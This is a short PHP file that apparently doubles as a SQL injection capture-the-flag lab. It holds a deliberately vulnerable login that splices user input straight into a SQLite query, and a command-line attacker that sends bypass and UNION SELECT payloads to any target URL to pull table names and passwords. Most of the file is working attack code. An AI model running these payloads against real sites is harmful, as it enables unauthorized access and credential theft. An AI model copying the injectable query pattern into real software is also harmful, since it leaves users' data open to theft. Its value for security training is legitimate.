#!/usr/bin/php
<?php
if(php_sapi_name()==="cli"){
    $target=$argv[1]??"http://localhost/sql_injection_advanced.php";
    $mode=$argv[2]??"auto";
    if($mode==="auto"){
        $payloads=["' OR '1'='1' -- ","admin' UNION SELECT null,name FROM sqlite_master-- ","' UNION SELECT null,password FROM users-- "];
        foreach($payloads as $p){
            $ch=curl_init($target);
            curl_setopt($ch,CURLOPT_POSTFIELDS,"user=".urlencode($p)."&pass=x");
            curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
            $res=curl_exec($ch);
            if(strpos($res,"FLAG{")!==false) echo "\033[92m[+] FLAG: ".trim(strip_tags($res))."\033[0m\n";
            elseif(strpos($res,"users")!==false) echo "\033[93m[+] TABLE: $res\033[0m\n";
            else echo "\033[91m[-] No result\033[0m\n";
            curl_close($ch);
        }
    }
    exit;
}
$db=new PDO('sqlite:arena.db');
$db->exec("CREATE TABLE IF NOT EXISTS users (id INTEGER, username TEXT, password TEXT)");
$db->exec("INSERT OR IGNORE INTO users VALUES(1,'admin','supersecret')");
$user=$_POST['user']??$_GET['user']??'';
$pass=$_POST['pass']??$_GET['pass']??'';
$stmt=$db->query("SELECT * FROM users WHERE username='$user' AND password='$pass'");
if($stmt && $stmt->fetch()){
    echo "FLAG{SQLi_1s_St1ll_D4ngerous_".md5($user.$pass)."}";
}else{
    http_response_code(403);
    echo "<form method=POST><input name=user><input name=pass type=password><input type=submit></form>";
}
?>